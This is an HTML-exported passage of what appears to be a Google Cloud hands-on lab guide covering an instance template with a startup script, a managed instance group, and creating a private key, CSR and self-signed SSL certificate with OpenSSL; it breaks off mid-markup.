md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - &lt;myaccount&gt;@&lt;mydomain&gt;.com (active)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/mydomain&gt;&lt;/myaccount&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - google1623327_student@qwiklabs.net</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ul><li><p><span>You can list the project ID with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = &lt;project_id&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/project_id&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-44776a13dea667a6</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> Full documentation of </span><strong><span>gcloud</span></strong><span> is available in the </span><a href='https://cloud.google.com/sdk/gcloud'><span>gcloud CLI overview guide </span></a><span>.</span></p><h2 id='task-1-create-a-compute-engine-template'><span>Task 1. Create a Compute Engine template</span></h2><p><span>In this task you create an instance template. This is a resource that you use to create virtual machine (VM) instances and managed instance groups (MIGs).</span></p><ol start='' ><li><p><span>In the Google Cloud console, in the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>), click </span><strong><span>Compute Engine &gt; Instance templates</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create Instance Template</span></strong><span>.</span></p></li><li><p><span>On the </span><strong><span>Create an instance template</span></strong><span> page, specify the following, and leave the remaining settings as their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Location</span></td><td style='text-align:left;' ><strong><span>Global</span></strong></td></tr><tr><td style='text-align:left;' ><span>Series</span></td><td style='text-align:left;' ><strong><span>E2</span></strong></td></tr><tr><td style='text-align:left;' ><span>Machine type</span></td><td style='text-align:left;' ><strong><span>e2-micro (2 vCPU)</span></strong></td></tr><tr><td style='text-align:left;' ><span>Access scopes</span></td><td style='text-align:left;' ><strong><span>Set access for each API</span></strong></td></tr><tr><td style='text-align:left;' ><span>Access scopes &gt; Compute Engine</span></td><td style='text-align:left;' ><strong><span>Read Only</span></strong></td></tr><tr><td style='text-align:left;' ><span>Firewall</span></td><td style='text-align:left;' ><strong><span>Allow HTTP traffic</span></strong></td></tr></tbody></table></figure><ol start='' ><li><p><span>Click </span><strong><span>Advanced options</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Management</span></strong><span>.</span></p></li><li><p><span>In </span><strong><span>Automation &gt; Startup script</span></strong><span>, copy and paste the following script:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># Copyright 2021 Google LLC</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># Licensed under the Apache License, Version 2.0 (the "License");</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># you may not use this file except in compliance with the License.# You may obtain a copy of the License at</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># http://www.apache.org/licenses/LICENSE-2.0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># Unless required by applicable law or agreed to in writing, software</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># distributed under the License is distributed on an "AS IS" BASIS,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># See the License for the specific language governing permissions and</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># limitations under the License.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get -y update</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get -y install git</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get -y install virtualenv</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">git clone https://github.com/GoogleCloudPlatform/python-docs-samples</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cd python-docs-samples/iap</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">virtualenv venv -p python3</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">source venv/bin/activate</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">pip install -r requirements.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat example_gce_backend.py |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sed -e "s/YOUR_BACKEND_SERVICE_ID/$(gcloud compute backend-services describe my-backend-service --global --format="value(id)")/g" |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  sed -e "s/YOUR_PROJECT_ID/$(gcloud config get-value account | tr -cd "[0-9]")/g" &gt; real_backend.py</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gunicorn real_backend:app -b 0.0.0.0:80</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 585px;"></div><div class="CodeMirror-gutters" style="display: none; height: 585px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>It takes a few moments to create your instance template.</span></p><h2 id='task-2-create-a-managed-instance-group'><span>Task 2. Create a managed instance group</span></h2><p><span>In this task you create a managed instance group (MIG), a collection of virtual machine (VM) instances that you manage as a single entity.</span></p><ol start='' ><li><p><span>In the Google Cloud console, in the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>), click </span><strong><span>Compute Engine &gt; Instance groups</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create Instance Group</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>New managed instance group (stateless)</span></strong><span> from the left-hand menu.</span></p></li><li><p><span>On the </span><strong><span>New managed instance group (stateless)</span></strong><span> page, specify the following, and leave the remaining settings as their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><strong><span>my-managed-instance-group</span></strong></td></tr><tr><td style='text-align:left;' ><span>Instance template</span></td><td style='text-align:left;' ><span>Select the instance template you created in Task 1.</span></td></tr><tr><td style='text-align:left;' ><span>Location</span></td><td style='text-align:left;' ><strong><span>Multiple zones</span></strong></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><strong><span>us-central1 (Iowa)</span></strong></td></tr><tr><td style='text-align:left;' ><span>Autoscaling &gt; Autoscaling mode</span></td><td style='text-align:left;' ><strong><span>Off: do not autoscale</span></strong></td></tr><tr><td style='text-align:left;' ><span>Number of instances</span></td><td style='text-align:left;' ><span>To change the number of instances, you must first turn off autoscaling; see below. When this is done, set the maximum number value to </span><strong><span>3</span></strong><span>.</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> Do not forget to set the number of instances after you change the autoscaling mode.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>It will take a few minutes to create the MIG.</span></p><h2 id='task-3-create-a-google-cloud-self-managed-ssl-certificate-resource'><span>Task 3. Create a Google Cloud self-managed SSL certificate resource</span></h2><p><span>In this task you create a private key, a certificate, and then a self-managed SSL certificate resource. Before you can create a Google Cloud SSL certificate resource, you must have a private key and certificate.</span></p><p><span>A </span><a href='https://cloud.google.com/load-balancing/docs/ssl-certificates/google-managed-certs'><span>Google Cloud SSL certificate</span></a><span> includes both a private key and the certificate itself, both in PEM format.</span></p><p><span>Self-managed SSL certificates are certificates that you obtain, provision, and renew yourself. You use this resource to secure communication between clients and your load balancer, which you create in the next task.</span></p><h3 id='create-a-private-key-and-certificate'><span>Create a private key and certificate</span></h3><ol start='' ><li><p><span>On the Google Cloud console title bar, click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Cloud Shell"><span>). If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>To create a new private key with RSA-2048 encryption in the PEM format </span><a href='https://www.openssl.org/docs/'><span>OpenSSL</span></a><span>, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">openssl genrsa -out PRIVATE_KEY_FILE 2048</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h4 id='create-a-csr'><span>Create a CSR</span></h4><p><span>Generate a certificate signing request (CSR) in the PEM format using </span><a href='https://www.openssl.org/source/'><span>OpenSSL</span></a><span>.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Open Editor</span></strong><span>. If prompted, click </span><strong><span>Open in a new window</span></strong><span>.</span></p></li><li><p><span>In Cloud Shell Editor, click the menu and select </span><strong><span>File &gt; New File</span></strong><span>.</span></p></li><li><p><span>For the filename, type </span><strong><span>ssl_config</span></strong><span>, and press enter.</span></p></li><li><p><span>Ensure the create file location is shown as /home &gt; student-XX-XXXXXXXXX/ssl_config and then click </span><strong><span>OK</span></strong><span>.</span></p></li><li><p><span>Copy and paste the following configuration into the </span><strong><span>Cloud Editor</span></strong><span> window:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[req]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">default_bits = 2048</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">req_extensions = extension_requirements</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">distinguished_name = dn_requirements</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">prompt = no</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[extension_requirements]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">basicConstraints = CA:FALSE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">keyUsage = nonRepudiation, digitalSignature, keyEncipherment</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[dn_requirements]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">countryName = US</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">stateOrProvinceName = CA</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">localityName = Mountain View</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">0.organizationName = Cloud</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">organizationalUnitName = Example</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">commonName = Test</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 383px;"></div><div class="CodeMirror-gutters" style="display: none; height: 383px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click the menu and select </span><strong><span>File &gt; Save</span></strong><span>.</span></p></li><li><p><span>Return to the previous tab. You may have to click </span><strong><span>Open Terminal</span></strong><span> to resume your </span><strong><span>Cloud Shell</span></strong><span> session.</span></p></li><li><p><span>To create a certificate signing request (CSR) file, run the following OpenSSL command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">openssl req -new -key PRIVATE_KEY_FILE \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> -out CSR_FILE \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> -config ssl_config</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><h4 id='sign-the-csr'><span>Sign the CSR</span></h4><p><span>When a Certificate Authority (CA) signs your CSR, it uses its own private key to create a certificate.</span></p><ul><li><p><span>To create a self-signed certificate for testing, run the following OpenSSL command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div 